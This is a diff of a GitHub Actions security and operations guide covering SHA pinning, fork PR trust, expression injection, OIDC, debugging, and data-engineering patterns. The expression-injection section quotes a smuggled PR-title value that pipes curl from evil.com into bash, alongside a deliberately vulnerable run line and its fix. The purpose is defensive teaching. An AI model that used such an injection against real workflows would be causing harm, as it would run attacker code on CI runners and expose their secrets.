-> [!success] Pin to full commit SHA
+> Every `uses:` line is code execution. Treat action references like production
+> dependencies, not like casual version labels.
 >
-> ```yaml
-> - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5  # v4.2.2
-> ```
-> The SHA is immutable — it cannot be changed after publishing. Add the version as a comment for human readability. Use tools like Dependabot or Renovate to automate SHA updates.
+> > [!danger] Mutable tags are a supply-chain risk
+> >
+> > `uses: actions/checkout@v4` resolves to whatever commit `v4` currently points
+> > to. If the action maintainer's account is compromised, `v4` can be repointed
+> > to malicious code. This has happened in real attacks.
+>
+> > [!success] Pin actions to a full commit SHA
+> >
+> > ```yaml
+> > - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5  # v4.2.2
+> > ```
+> > The SHA is immutable. Add the version as a comment for readability and use
+> > automation such as Dependabot or Renovate to keep pins current.
 
-### GitHub Actions | security | fork PR trust boundaries
+### security | fork PR trust boundaries
 
 | Trigger | Code source | Secrets available? | Write permissions? |
 |---------|-------------|-------------------|-------------------|
@@ -2036,26 +2153,33 @@ gh variable set DEMO_REGION -R alp78/git-lab --env staging --body "europe-west1"
 | `pull_request_target` | Base branch | Yes | Yes |
 | `workflow_run` | Default branch | Yes | Yes |
 
-### GitHub Actions | security | expression injection
+### security | expression injection
 
-> [!danger] Interpolating untrusted values in shell commands is command injection
+> [!warning] Untrusted event data becomes executable if you template it into shell syntax
 >
-> ```yaml
-> # DANGEROUS — PR title could contain: '; curl evil.com | bash; echo '
-> run: echo "PR title: ${{ github.event.pull_request.title }}"
-> ```
-> The expression is substituted before bash runs, so shell metacharacters in the PR title execute as commands.
-
-> [!success] Use environment variables for untrusted data
+> Pull request titles, comments, branch names, and similar event fields should be
+> treated as attacker-controlled input whenever they come from external actors.
 >
-> ```yaml
-> env:
->   PR_TITLE: ${{ github.event.pull_request.title }}
-> run: echo "PR title: $PR_TITLE"
-> ```
-> Shell variables are not expanded by bash the same way — `$PR_TITLE` is treated as a single string value, not interpreted as shell code.
+> > [!danger] Interpolating untrusted values in shell commands is command injection
+> >
+> > ```yaml
+> > # DANGEROUS — PR title could contain: '; curl evil.com | bash; echo '
+> > run: echo "PR title: ${{ github.event.pull_request.title }}"
+> > ```
+> > The expression is substituted before bash runs, so shell metacharacters in
+> > the PR title execute as commands.
+>
+> > [!success] Pass untrusted data through environment variables
+> >
+> > ```yaml
+> > env:
+> >   PR_TITLE: ${{ github.event.pull_request.title }}
+> > run: echo "PR title: $PR_TITLE"
+> > ```
+> > `$PR_TITLE` is treated as a single shell value instead of being parsed as
+> > code injected into the command template.
 
-### GitHub Actions | security | OIDC fundamentals
+### security | OIDC fundamentals
 
 **What problem OIDC solves:** Traditional cloud authentication requires storing long-lived service account keys as GitHub secrets. If a secret leaks (in logs, to a fork, via a compromised action), the attacker has permanent access until the key is rotated.
 
@@ -2230,9 +2354,9 @@ Waiting on bqjob_r5215c3ef6e9cbc1a_0000019d82c3a3be_1 ... (0s) Current status: D
 ]
 ```
 
-## Actions Ecosystem
+## How reusable building blocks in the Actions ecosystem differ
 
-### GitHub Actions | actions | reusable workflows vs composite vs JS/Docker
+### actions | reusable workflows vs composite vs JS/Docker
 
 | Type | Defined in | Caller syntax | Runs on | Inputs | Can access `secrets`? |
 |------|-----------|---------------|---------|--------|----------------------|
@@ -2245,7 +2369,7 @@ Use a reusable workflow when whole job graphs or pipeline templates must be shar
 Use a composite action when you need to reuse a fixed sequence of same-runner steps such as setup, build, or test orchestration.
 Use a JavaScript or Docker action when the logic needs its own packaged runtime, dependencies, or container image.
 
-### GitHub Actions | actions | action.yml metadata basics
+### actions | action.yml metadata basics
 
 Every action has an `action.yml` (or `action.yaml`) that declares its inputs, outputs, and execution method.
 
@@ -2268,9 +2392,9 @@ runs:
       run: pip install -r requirements.txt
 ```
 
-## Debugging and Observability
+## How to inspect runs, logs, and runtime context
 
-### GitHub Actions | debugging | reading logs
+### debugging | reading logs
 
 Workflow run logs are available via the GitHub UI (`Actions` tab) and the CLI. Step-level logs are grouped and expandable.
 
@@ -2288,13 +2412,13 @@ gh run view 24312297713 -R alp78/git-lab --log
 gh run view --job=70983934563 -R alp78/git-lab --log
 ```
 
-### GitHub Actions | debugging | enabling debug logging
+### debugging | enabling debug logging
 
 **Method 1 — Re-run with debug:** In the GitHub UI, click "Re-run jobs" and check "Enable debug logging." This sets `ACTIONS_RUNNER_DEBUG=true` and `ACTIONS_STEP_DEBUG=true`.
 
 **Method 2 — Repository secret:** Set a secret named `ACTIONS_STEP_DEBUG` with value `true`. This enables debug logging for all runs.
 
-### GitHub Actions | debugging | workflow commands and annotations
+### debugging | workflow commands and annotations
 
 ```yaml
 - name: Annotations and grouping
@@ -2310,7 +2434,7 @@ gh run view --job=70983934563 -R alp78/git-lab --log
 
 Annotations appear as decorations on the workflow run summary and in PR checks.
 
-### GitHub Actions | debugging | inspecting contexts safely
+### debugging | inspecting contexts safely
 
 ```yaml
 - name: Dump runner context
@@ -2329,15 +2453,23 @@ Annotations appear as decorations on the workflow run summary and in PR checks.
 }
 ```
 
-> [!danger] Never dump the secrets context
+> [!warning] Debug dumps must respect context sensitivity
 >
-> `echo '${{ toJSON(secrets) }}'` will log all secret names (values are masked, but the keys leak). Secret names can reveal infrastructure details.
-
-> [!success] Dump only non-sensitive contexts
+> Context inspection is useful for debugging, but some contexts reveal more than
+> values alone. Even secret names can disclose infrastructure details and attack
+> surface.
 >
-> Safe to dump: `github`, `runner`, `env`, `vars`, `matrix`, `inputs`, `needs`, `steps`. Never dump: `secrets`.
+> > [!danger] Never dump the `secrets` context
+> >
+> > `echo '${{ toJSON(secrets) }}'` logs all secret names. Values are masked, but
+> > the keys still leak sensitive operational information.
+>
+> > [!success] Dump only non-sensitive contexts
+> >
+> > Safe to dump: `github`, `runner`, `env`, `vars`, `matrix`, `inputs`,
+> > `needs`, `steps`. Never dump: `secrets`.
 
-### GitHub Actions | debugging | local testing with act
+### debugging | local testing with act
 
 [`act`](https://github.com/nektos/act) runs GitHub Actions workflows locally using Docker. It is useful for rapid iteration but has significant limitations:
 
@@ -2353,13 +2485,13 @@ Annotations appear as decorations on the workflow run summary and in PR checks.
 
 Use `act` for quick syntax checks and basic step validation. Always validate critical workflows on real GitHub-hosted runners.
 
-## Data-Engineering Examples
+## How the core patterns apply to data-engineering workflows
 
-### GitHub Actions | data-engineering | BigQuery OIDC auth
+### data-engineering | BigQuery OIDC auth
 
 The OIDC workflow in the Security Fundamentals section demonstrates end-to-end GCP authentication from GitHub Actions, including BigQuery dry-run validation and live queries against the `stoxx_bronze` dataset. This is the preferred pattern for all data-engineering workflows that interact with GCP — no long-lived service account keys needed.
 
-### GitHub Actions | data-engineering | service containers for databases
+### data-engineering | service containers for databases
 
 The service container demo in the Jobs section shows how to run PostgreSQL as a sidecar for integration testing. This pattern applies directly to data-engineering scenarios:
 
@@ -2367,7 +2499,7 @@ The service container demo in the Jobs section shows how to run PostgreSQL as a 
 - **SQL validation:** Execute validation queries against test data to catch errors before deploying to production
 - **Pipeline testing:** Run pipeline code that inserts and queries data, verifying end-to-end correctness
 
-### GitHub Actions | data-engineering | artifact patterns
+### data-engineering | artifact patterns
 
 Common data-engineering artifacts:
 
@@ -2379,7 +2511,7 @@ Common data-engineering artifacts:
 | Coverage reports | Test job | Summary/reporting | 30 days |
 | Cost estimation | BQ dry-run job | PR comment job | 5 days |
 
-## Troubleshooting
+## Common failures and the fixes they require
 
 | Symptom | Cause | Fix |
 |---------|-------|-----|
@@ -2399,7 +2531,7 @@ Common data-engineering artifacts:
 | Concurrency cancels wanted runs | `cancel-in-progress: true` on a shared group | Use more specific group names (include branch, PR number, or environment) |
 | Reusable workflow fails to find caller secrets | Secrets not passed via `secrets:` key | Explicitly pass each secret or use `secrets: inherit` |
 
-## Operating Guidance
+## Operating rules that should be standard in every workflow
 
 1. **Always set `permissions:`** — every workflow should declare explicit, least-privilege permissions.
 2. **Pin actions to full SHA** — never use mutable tags for third-party actions in production workflows.
@@ -2412,7 +2544,7 @@ Common data-engineering artifacts:
 9. **Validate fork PR trust boundaries** — understand which triggers expose secrets and which don't.
 10. **Keep workflow files small and focused** — prefer reusable workflows and composite actions over monolithic YAML files.
 
-## Quick Reference
+## Key syntax and commands at a glance
 
 | Task | YAML/Command |
 |------|--------------|
@@ -2448,7 +2580,7 @@ Common data-engineering artifacts:
 | View run logs (CLI) | `gh run view <id> --log` |
 | Trigger dispatch (CLI) | `gh workflow run <name> -f key=value` |
 
-## References
+## Reference links for deeper documentation
 
 - [GitHub Actions documentation](https://docs.github.com/en/actions)
 - [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
